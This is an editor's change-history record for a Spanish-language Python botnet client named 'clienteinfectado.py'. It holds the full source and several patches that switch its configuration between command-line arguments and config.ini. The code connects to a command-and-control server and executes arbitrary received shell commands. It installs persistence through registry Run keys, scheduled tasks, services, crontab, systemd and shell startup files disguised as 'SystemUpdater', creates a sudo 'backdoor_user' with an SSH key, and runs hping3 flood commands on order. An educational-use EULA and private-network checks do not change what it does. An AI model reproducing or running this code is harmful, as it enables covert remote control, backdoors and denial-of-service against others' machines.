{
    "sourceFile": "src/clienteinfectado.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 4,
            "patches": [
                {
                    "date": 1740226529019,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740241008581,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -481,19 +481,27 @@\n         logging.error(f\"Error al ejecutar el bot: {e}\")\r\n \r\n if __name__ == \"__main__\":\r\n     try:\r\n-        if not validar_ip(args.host):\r\n+        config_path = os.path.join(BASE_DIR, \"config\", \"config.ini\")\r\n+        if not os.path.exists(config_path):\r\n+            print(\"[ERROR] No se encontr贸 config.ini en la carpeta config/\")\r\n+            sys.exit(1)\r\n+\r\n+        config = configparser.ConfigParser()\r\n+        config.read(config_path)\r\n+\r\n+        if not validar_ip(config.get(\"SERVER\", \"HOST\")):\r\n             logging.error(\"[ERROR] IP no v谩lida.\")\r\n             sys.exit(1)\r\n             \r\n-        if not validar_puerto(args.port):\r\n+        if not validar_puerto(config.getint(\"SERVER\", \"PORT\")):\r\n             logging.error(\"[ERROR] Puerto fuera de rango (1-65535).\")\r\n             sys.exit(1)\r\n             \r\n         verificar_eula(\"cliente\")\r\n-        HOST = args.host\r\n-        PORT = args.port\r\n+        HOST = config.get(\"SERVER\", \"HOST\")\r\n+        PORT = config.getint(\"SERVER\", \"PORT\")\r\n \r\n         logging.info(f\"Conectando a {HOST}:{PORT} con autenticaci贸n segura...\")\r\n \r\n         if esEntornoCloud():\r\n@@ -502,8 +510,8 @@\n         if not es_red_privada(HOST):\r\n             logging.error(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada.\")\r\n             sys.exit(1)\r\n \r\n-        SECRET_KEY = args.key\r\n+        SECRET_KEY = config.get(\"AUTH\", \"KEY\")\r\n         ejecutar_bot()\r\n     except Exception as e:\r\n         logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740255421077,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -248,10 +248,10 @@\n \r\n def conectar_a_CnC():\r\n     try:\r\n         bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n-        bot.connect((HOST, PORT))\r\n-        logging.info(f\"Conectado al servidor C&C {HOST}:{PORT}\")\r\n+        bot.connect((args.host, args.port))\r\n+        logging.info(f\"Conectado al servidor C&C {args.host}:{args.port}\")\r\n         return bot\r\n     except Exception as e:\r\n         logging.error(f\"Error al conectar con el C&C: {traceback.format_exc()}\")\r\n         sys.exit(1)\r\n@@ -481,27 +481,19 @@\n         logging.error(f\"Error al ejecutar el bot: {e}\")\r\n \r\n if __name__ == \"__main__\":\r\n     try:\r\n-        config_path = os.path.join(BASE_DIR, \"config\", \"config.ini\")\r\n-        if not os.path.exists(config_path):\r\n-            print(\"[ERROR] No se encontr贸 config.ini en la carpeta config/\")\r\n-            sys.exit(1)\r\n-\r\n-        config = configparser.ConfigParser()\r\n-        config.read(config_path)\r\n-\r\n-        if not validar_ip(config.get(\"SERVER\", \"HOST\")):\r\n+        if not validar_ip(args.host):\r\n             logging.error(\"[ERROR] IP no v谩lida.\")\r\n             sys.exit(1)\r\n             \r\n-        if not validar_puerto(config.getint(\"SERVER\", \"PORT\")):\r\n+        if not validar_puerto(args.port):\r\n             logging.error(\"[ERROR] Puerto fuera de rango (1-65535).\")\r\n             sys.exit(1)\r\n             \r\n         verificar_eula(\"cliente\")\r\n-        HOST = config.get(\"SERVER\", \"HOST\")\r\n-        PORT = config.getint(\"SERVER\", \"PORT\")\r\n+        HOST = args.host\r\n+        PORT = args.port\r\n \r\n         logging.info(f\"Conectando a {HOST}:{PORT} con autenticaci贸n segura...\")\r\n \r\n         if esEntornoCloud():\r\n@@ -510,8 +502,8 @@\n         if not es_red_privada(HOST):\r\n             logging.error(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada.\")\r\n             sys.exit(1)\r\n \r\n-        SECRET_KEY = config.get(\"AUTH\", \"KEY\")\r\n+        SECRET_KEY = args.key\r\n         ejecutar_bot()\r\n     except Exception as e:\r\n         logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740259342129,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -505,5 +505,6 @@\n         logging.info(f\"Conectando a {HOST}:{PORT} con autenticaci贸n segura...\")\r\n \r\n         if esEntornoCloud():\r\n             logging.error(\"[ERROR] No puedes ejecutar este programa en un servidor cloud.\")\r\n-        logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n\\ No newline at end of file\n+            sys.exit(1)\r\n+        if not es_red_privada(HOST):\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740260333774,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -499,9 +499,9 @@\n             sys.exit(1)\r\n             \r\n         verificar_eula(\"cliente\")\r\n         HOST = args.host\r\n-        PORT = args.port\r\n+        PORT = args.port  # Usar el puerto CnC (5001)\r\n \r\n         logging.info(f\"Conectando a {HOST}:{PORT} con autenticaci贸n segura...\")\r\n \r\n         if esEntornoCloud():\r\n"
                }
            ],
            "date": 1740226529019,
            "name": "Commit-0",
            "content": "import socket\r\nimport subprocess\r\nimport platform\r\nimport os\r\nimport ipaddress\r\nimport uuid\r\nimport requests\r\nimport argparse\r\nimport re\r\nimport sys\r\nimport logging\r\nimport configparser\r\nimport traceback\r\nimport time\r\nimport hashlib\r\n\r\nBASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\"))\r\nparser = argparse.ArgumentParser(description=\"Cliente infectado para conectar al C&C.\")\r\nparser.add_argument(\"--host\", required=True, help=\"IP del servidor C&C\")\r\nparser.add_argument(\"--port\", type=int, required=True, help=\"Puerto del servidor C&C\")\r\nparser.add_argument(\"--key\", required=True, help=\"Clave de autenticaci贸n\")\r\nargs = parser.parse_args()\r\n\r\n# Configurar logging\r\ndef configurar_logging():\r\n    \"\"\"\r\n    Configura el sistema de logging para el cliente infectado.\r\n\r\n    La configuraci贸n se lee desde el archivo \"config.ini\" en la carpeta \"config\"\r\n    en el directorio ra铆z del proyecto. Si no se encuentra el archivo, se muestra\r\n    un mensaje de error y se sale del programa.\r\n\r\n    La ruta del archivo de log se establece en el directorio \"logs\" en el\r\n    directorio ra铆z del proyecto. Si no existe, se crea.\r\n\r\n    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de\r\n    configuraci贸n. El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\"\r\n    o \"CRITICAL\". Si no se especifica un nivel de log, se establece en \"INFO\"\r\n    por defecto.\r\n\r\n    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n    \"\"\"\r\n\r\n    try:\r\n        config_path = os.path.join(BASE_DIR, \"config\", \"config.ini\")\r\n        if not os.path.exists(config_path):\r\n            print(\"[ERROR] No se encontr贸 config.ini en la carpeta config/\")\r\n            sys.exit(1)\r\n\r\n        config = configparser.ConfigParser()\r\n        config.read(config_path)\r\n\r\n        # Ruta absoluta para el directorio de logs en el directorio ra铆z del proyecto\r\n        log_dir = os.path.join(BASE_DIR, config.get(\"LOGGING\", \"LOG_DIR\", fallback=\"logs\"))\r\n        log_file = config.get(\"LOGGING\", \"CLIENT_LOG_FILE\", fallback=\"client.log\")\r\n\r\n        # Asegurar que la carpeta logs exista en el directorio ra铆z del proyecto\r\n        os.makedirs(log_dir, exist_ok=True)\r\n\r\n        log_path = os.path.join(log_dir, log_file)\r\n\r\n        log_level = config.get(\"LOGGING\", \"LOG_LEVEL\", fallback=\"INFO\").upper()\r\n        log_levels = {\r\n            \"DEBUG\": logging.DEBUG,\r\n            \"INFO\": logging.INFO,\r\n            \"WARNING\": logging.WARNING,\r\n            \"ERROR\": logging.ERROR,\r\n            \"CRITICAL\": logging.CRITICAL\r\n        }\r\n\r\n        logging.basicConfig(\r\n            level=log_levels.get(log_level, logging.INFO),\r\n            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n            handlers=[\r\n                logging.FileHandler(log_path, encoding=\"utf-8\"),  # Guardar en archivo\r\n                logging.StreamHandler()  # Mostrar en pantalla\r\n            ]\r\n        )\r\n\r\n        logging.info(f\"Logging configurado correctamente en {log_path}\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al configurar el logging: {e}\")\r\n\r\n# Llamar a la funci贸n de configuraci贸n de logging al inicio del script\r\nconfigurar_logging()\r\n\r\ndef validar_ip(ip):\r\n    \r\n    \"\"\"\r\n    Verifica que una IP sea v谩lida.\r\n\r\n    Utiliza una expresi贸n regular para verificar que la IP tenga el formato\r\n    correcto. La expresi贸n regular coincide con direcciones IP en formato\r\n    decimal (por ejemplo, 127.0.0.1).\r\n\r\n    Parameters:\r\n    ip (str): La IP a verificar.\r\n\r\n    Returns:\r\n    bool: True si la IP es v谩lida, False en caso contrario.\r\n    \"\"\"\r\n    \r\n    try:\r\n        patron = re.compile(r\"^(?:\\d{1,3}\\.){3}\\d{1,3}$\")\r\n        return patron.match(ip) is not None\r\n    except Exception as e:\r\n        logging.error(f\"Error al validar la IP: {e}\")\r\n        return False\r\n\r\ndef validar_puerto(port):\r\n    \r\n    \"\"\"\r\n    Verifica que un puerto sea v谩lido.\r\n\r\n    Un puerto v谩lido es un n煤mero entre 1 y 65535.\r\n\r\n    Parameters:\r\n    port (int): El puerto a verificar.\r\n\r\n    Returns:\r\n    bool: True si el puerto es v谩lido, False en caso contrario.\r\n    \"\"\"\r\n\r\n    try:\r\n        return 1 <= port <= 65535\r\n    except Exception as e:\r\n        logging.error(f\"Error al validar el puerto: {e}\")\r\n        return False\r\n\r\ndef esEntornoCloud():\r\n    \"\"\"Indica si el programa se ejecuta en un entorno de cloud computing.\r\n\r\n    La funci贸n intenta conectarse a los puntos de metadata de varios proveedores de cloud\r\n    (AWS, Google Cloud, Azure, DigitalOcean) y devuelve True si alguno de ellos responde.\r\n    Si no se logra conectar a ninguno de ellos, se devuelve False.\r\n\r\n    Returns:\r\n        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n    \"\"\"\r\n    cloud_metadata_urls = [\r\n        \"http://169.254.169.254/latest/meta-data/\",  # AWS\r\n        \"http://metadata.google.internal/\",  # Google Cloud\r\n        \"http://169.254.169.254/metadata/v1/\",  # DigitalOcean\r\n        \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"  # Azure\r\n    ]\r\n\r\n    for url in cloud_metadata_urls:\r\n        try:\r\n            if requests.get(url, timeout=1).status_code == 200:\r\n                logging.info(f\"Entorno de cloud computing detectado: {url}\")\r\n                return True\r\n        except requests.exceptions.RequestException:\r\n            continue\r\n        except Exception as e:\r\n            logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n\r\n    return False\r\n\r\ndef es_red_privada(ip):\r\n    \"\"\"Indica si una IP es de una red privada o no.\r\n\r\n    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n    devuelve False.\r\n\r\n    Parameters:\r\n    ip (str): La IP a verificar.\r\n\r\n    Returns:\r\n    bool: True si la IP es de una red privada, False si no lo es.\r\n    \"\"\"\r\n\r\n    try:\r\n        return ipaddress.ip_address(ip).is_private\r\n    except ValueError as e:\r\n        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n        return False\r\n    \r\ndef verificar_eula(tipo):\r\n    \"\"\"\r\n    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n    \r\n    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n    \"\"\"\r\n    try:\r\n        if tipo not in [\"servidor\", \"cliente\"]:\r\n            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n\r\n        # Ruta para el archivo EULA en la carpeta docs\r\n        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n\r\n        # Si no existe, lo crea\r\n        if not os.path.exists(eula_path):\r\n            with open(eula_path, \"w\") as f:\r\n                f.write(\"ACCEPTED=False\")\r\n\r\n        # Leer si ya acept贸\r\n        with open(eula_path, \"r\") as f:\r\n            for linea in f:\r\n                if \"ACCEPTED=True\" in linea:\r\n                    return True\r\n\r\n        # Mostrar Acuerdo de Licencia\r\n        print(\"\\n\" + \"=\"*50)\r\n        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n        print(\"=\"*50)\r\n        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n        \r\n        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n        print(\"   - Usarlo con intenciones maliciosas.\")\r\n        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n        print(\"   - Modificarlo para evadir restricciones.\")\r\n        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n        \r\n        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n        \r\n        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n        \r\n        if respuesta == \"ACEPTO\":\r\n            with open(eula_path, \"w\") as f:\r\n                f.write(\"ACCEPTED=True\")\r\n            return True\r\n        else:\r\n            print(\"Debe aceptar la licencia para usar este software.\")\r\n            exit()\r\n    except Exception as e:\r\n        logging.error(f\"Error al verificar el EULA: {e}\")\r\n        exit()\r\n\r\ndef detectar_sistema():\r\n    \r\n    \"\"\"\r\n    Detecta el sistema operativo del bot.\r\n\r\n    Usa la funci贸n platform.system() para determinar el sistema operativo\r\n    del bot y devuelve el resultado en min煤sculas, ya sea \"windows\" o \"linux\".\r\n    \"\"\"\r\n    try:\r\n        return platform.system().lower()  # \"windows\" o \"linux\"\r\n    except Exception as e:\r\n        logging.error(f\"Error al detectar el sistema operativo: {e}\")\r\n        return \"desconocido\"\r\n\r\ndef conectar_a_CnC():\r\n    try:\r\n        bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        bot.connect((HOST, PORT))\r\n        logging.info(f\"Conectado al servidor C&C {HOST}:{PORT}\")\r\n        return bot\r\n    except Exception as e:\r\n        logging.error(f\"Error al conectar con el C&C: {traceback.format_exc()}\")\r\n        sys.exit(1)\r\n\r\ndef intentar_persistencia():\r\n\r\n    \"\"\"\r\n    Intenta establecer persistencia en el sistema operativo del bot.\r\n\r\n    Dependiendo del sistema operativo detectado, ejecuta una serie de comandos\r\n    que intentan asegurar la persistencia del bot en el sistema. En Windows,\r\n    utiliza m茅todos como el registro, tareas programadas y servicios. En Linux,\r\n    emplea crontab, systemd y modificaciones en archivos de inicio. Si alguno\r\n    de los m茅todos tiene 茅xito, se detiene el proceso y devuelve un mensaje\r\n    indicando el m茅todo exitoso. Si todos fallan, devuelve un mensaje de error.\r\n\r\n    :return: Un mensaje indicando si se logr贸 la persistencia o un error.\r\n    :rtype: str\r\n    \"\"\"\r\n\r\n    so = detectar_sistema()\r\n    persistencia_exitosa = False\r\n    mensaje_final = \"[ERROR] No se pudo establecer persistencia\"\r\n\r\n    if so == \"windows\":\r\n        comandos = [\r\n                # 1. Registro de Windows\r\n                'reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v SystemUpdater /t REG_SZ /d \"%APPDATA%\\\\clienteinfectado.exe\" /f',\r\n                # 2. Tarea Programada\r\n                'schtasks /create /tn \"SystemUpdater\" /tr \"%APPDATA%\\\\clienteinfectado.exe\" /sc ONLOGON /rl HIGHEST',\r\n                # 3. Carpeta de Inicio\r\n                'copy %APPDATA%\\\\clienteinfectado.exe %USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\SystemUpdater.exe',\r\n                # 4. Servicio de Windows\r\n                'sc create SystemUpdater binPath= \"%APPDATA%\\\\clienteinfectado.exe\" start= auto',\r\n                # 5. WMI Events (requiere admin)\r\n                'powershell New-ScheduledTaskTrigger -AtLogon | Register-ScheduledTask -TaskName \"SystemUpdater\" -Action (New-ScheduledTaskAction -Execute \"%APPDATA%\\\\clienteinfectado.exe\")'\r\n            ]\r\n\r\n    elif so == \"linux\":\r\n        comandos = [\r\n            # 1. Crontab\r\n            \"(crontab -l ; echo '@reboot nohup python3 ~/clienteinfectado.py &') | crontab -\",\r\n            # 2. Systemd Service\r\n            \"\"\"echo '[Unit]\r\n                Description=Bot Persistente\r\n                After=network.target\r\n\r\n                [Service]\r\n                ExecStart=/usr/bin/python3 ~/clienteinfectado.py\r\n                Restart=always\r\n                User=$USER\r\n\r\n                [Install]\r\n                WantedBy=multi-user.target' | sudo tee /etc/systemd/system/bot.service && sudo systemctl enable bot.service\"\"\",\r\n            # 3. Modificaci贸n de ~/.bashrc\r\n            \"echo 'python3 ~/clienteinfectado.py &' >> ~/.bashrc\",\r\n            # 4. Modificaci贸n de /etc/profile (requiere root)\r\n            \"sudo sh -c 'echo python3 ~/clienteinfectado.py >> /etc/profile'\",\r\n            # 5. Crear usuario SSH con clave autorizada\r\n            \"sudo useradd -m -s /bin/bash backdoor_user && echo 'backdoor_user:password' | sudo chpasswd && sudo usermod -aG sudo backdoor_user\",\r\n            \"mkdir -p /home/backdoor_user/.ssh && echo 'ssh-rsa AAAAB3...' > /home/backdoor_user/.ssh/authorized_keys\",\r\n            \"chmod 600 /home/backdoor_user/.ssh/authorized_keys && chown -R backdoor_user:backdoor_user /home/backdoor_user/.ssh\"\r\n        ]\r\n\r\n    else:\r\n        return mensaje_final  # Sistema no reconocido\r\n\r\n    for cmd in comandos:\r\n        try:\r\n            resultado = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\r\n            if resultado.returncode == 0:\r\n                persistencia_exitosa = True\r\n                mensaje_final = f\"[OK] Persistencia establecida con: {cmd.split()[0]}\"\r\n                break  # Detener el intento tras el primer 茅xito\r\n        except Exception as e:\r\n            logging.error(f\"Error al intentar establecer persistencia: {e}\")\r\n            continue  # Si un m茅todo falla, probar el siguiente\r\n\r\n    return mensaje_final\r\n\r\ndef enviar_respuesta_completa(bot, respuesta):\r\n    \"\"\"\r\n    Env铆a una respuesta completa al servidor, manejando respuestas grandes.\r\n\r\n    :param bot: El socket del bot conectado.\r\n    :type bot: socket.socket\r\n    :param respuesta: La respuesta a enviar.\r\n    :type respuesta: bytes\r\n    \"\"\"\r\n    try:\r\n        # Dividir la respuesta en partes si es muy grande\r\n        for i in range(0, len(respuesta), 4096):\r\n            bot.send(respuesta[i:i+4096])\r\n        # Enviar una se帽al de fin de respuesta\r\n        bot.send(b\"<END_OF_RESPONSE>\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al enviar la respuesta completa: {e}\")\r\n\r\ndef esperar_ordenes(bot):\r\n    global ddos_running\r\n    ddos_running = False\r\n    while True:\r\n        try:\r\n            orden = bot.recv(1024).decode('utf-8', errors='ignore').strip()\r\n            if not orden:\r\n                continue\r\n            \r\n            logging.info(f\"Comando recibido: {orden}\")\r\n\r\n            if orden == \"detect_os\":\r\n                bot.send(detectar_sistema().encode(\"utf-8\"))\r\n                continue\r\n            elif orden == \"persistencia\":\r\n                resultado = intentar_persistencia().encode(\"utf-8\")\r\n            elif \"hping3\" in orden or \"Test-NetConnection\" in orden:\r\n                ddos_running = True\r\n                resultado = simular_ddos(orden).encode(\"utf-8\")\r\n            elif orden == \"stop_ddos\":\r\n                ddos_running = False\r\n                resultado = \"[INFO] DDoS detenido\".encode(\"utf-8\")\r\n            else:\r\n                so = detectar_sistema()\r\n                if so == \"windows\":\r\n                    resultado = ejecutar_comando(orden)\r\n                elif so == \"linux\":\r\n                    resultado = ejecutar_comando(orden)\r\n                else:\r\n                    resultado = f\"[ERROR] Sistema operativo no reconocido: {so}\".encode(\"utf-8\")\r\n\r\n            enviar_respuesta_completa(bot, resultado if resultado else b\"Comando ejecutado sin salida\")\r\n\r\n        except ConnectionResetError:\r\n            logging.info(\"El servidor ha cerrado la conexi贸n.\")\r\n            break\r\n        except Exception as e:\r\n            logging.error(f\"Error en la comunicaci贸n con el servidor: {traceback.format_exc()}\")\r\n            break\r\n\r\ndef ejecutar_comando(orden):\r\n    \"\"\"\r\n    Ejecuta un comando en el sistema operativo del bot.\r\n\r\n    Utiliza subprocess.check_output para ejecutar el comando y captura cualquier\r\n    excepci贸n que ocurra durante la ejecuci贸n. Si el comando se ejecuta\r\n    correctamente, devuelve la salida del comando. Si ocurre un error, devuelve\r\n    el mensaje de error.\r\n\r\n    :param orden: El comando a ejecutar.\r\n    :type orden: str\r\n    :return: La salida del comando o un mensaje de error.\r\n    :rtype: bytes\r\n    \"\"\"\r\n    try:\r\n        resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT)\r\n        return resultado\r\n    except subprocess.CalledProcessError as e:\r\n        logging.error(f\"Error al ejecutar el comando '{orden}': {e.output.decode()}\")\r\n        return f\"Error: {e.output.decode()}\".encode('utf-8')\r\n    except Exception as e:\r\n        logging.error(f\"Error inesperado al ejecutar el comando '{orden}': {traceback.format_exc()}\")\r\n        return f\"Error inesperado: {str(e)}\".encode('utf-8')\r\n\r\ndef simular_ddos(orden):\r\n    \"\"\"\r\n    Simula un ataque DDoS de manera lenta y sin capacidad de realizar un ataque real.\r\n\r\n    :param orden: El comando de DDoS a simular.\r\n    :type orden: str\r\n    :return: Un mensaje indicando que la simulaci贸n se ha completado.\r\n    :rtype: str\r\n    \"\"\"\r\n    try:\r\n        for i in range(10):\r\n            if not ddos_running:\r\n                break\r\n            if \"hping3\" in orden:\r\n                subprocess.run(orden, shell=True)\r\n            elif \"Test-NetConnection\" in orden:\r\n                subprocess.run(orden, shell=True)\r\n            time.sleep(5)  # Esperar 5 segundos entre cada intento\r\n        return \"[INFO] Simulaci贸n de DDoS completada\"\r\n    except Exception as e:\r\n        logging.error(f\"Error al simular DDoS: {traceback.format_exc()}\")\r\n        return \"[ERROR] Error al simular DDoS\"\r\n\r\ndef generar_identificador_unico():\r\n    \"\"\"\r\n    Genera un identificador 煤nico para el cliente infectado basado en la informaci贸n del sistema.\r\n\r\n    Utiliza informaci贸n como el nombre del host, la direcci贸n MAC y el sistema operativo\r\n    para crear un hash SHA-256 que identifica de manera 煤nica al cliente.\r\n\r\n    :return: Un identificador 煤nico en formato hexadecimal.\r\n    :rtype: str\r\n    \"\"\"\r\n    try:\r\n        hostname = socket.gethostname()\r\n        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))\r\n        sistema_operativo = platform.system().lower()\r\n        info_unica = f\"{hostname}-{mac}-{sistema_operativo}\"\r\n        identificador = hashlib.sha256(info_unica.encode()).hexdigest()\r\n        logging.info(f\"Identificador 煤nico generado: {identificador}\")\r\n        return identificador\r\n    except Exception as e:\r\n        logging.error(f\"Error al generar el identificador 煤nico: {e}\")\r\n        return None\r\n\r\ndef ejecutar_bot():\r\n    \r\n    \"\"\"\r\n    Funci贸n principal que conecta el bot al servidor C&C y espera 贸rdenes.\r\n\r\n    Establece la conexi贸n con el servidor de Comando y Control (C&C) usando\r\n    la funci贸n conectar_a_CnC y luego entra en un bucle para recibir y\r\n    procesar 贸rdenes mediante la funci贸n esperar_ordenes.\r\n\r\n    :return: None\r\n    \"\"\"\r\n\r\n    try:\r\n        bot = conectar_a_CnC() # Conectar al servidor C&C\r\n        identificador_unico = generar_identificador_unico()\r\n        if identificador_unico:\r\n            bot.send(identificador_unico.encode(\"utf-8\"))\r\n        esperar_ordenes(bot) # Esperar y procesar 贸rdenes\r\n    except Exception as e:\r\n        logging.error(f\"Error al ejecutar el bot: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        if not validar_ip(args.host):\r\n            logging.error(\"[ERROR] IP no v谩lida.\")\r\n            sys.exit(1)\r\n            \r\n        if not validar_puerto(args.port):\r\n            logging.error(\"[ERROR] Puerto fuera de rango (1-65535).\")\r\n            sys.exit(1)\r\n            \r\n        verificar_eula(\"cliente\")\r\n        HOST = args.host\r\n        PORT = args.port\r\n\r\n        logging.info(f\"Conectando a {HOST}:{PORT} con autenticaci贸n segura...\")\r\n\r\n        if esEntornoCloud():\r\n            logging.error(\"[ERROR] No puedes ejecutar este programa en un servidor cloud.\")\r\n            sys.exit(1)\r\n        if not es_red_privada(HOST):\r\n            logging.error(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada.\")\r\n            sys.exit(1)\r\n\r\n        SECRET_KEY = args.key\r\n        ejecutar_bot()\r\n    except Exception as e:\r\n        logging.error(f\"Error en la ejecuci贸n principal: {e}\")"
        }
    ]
}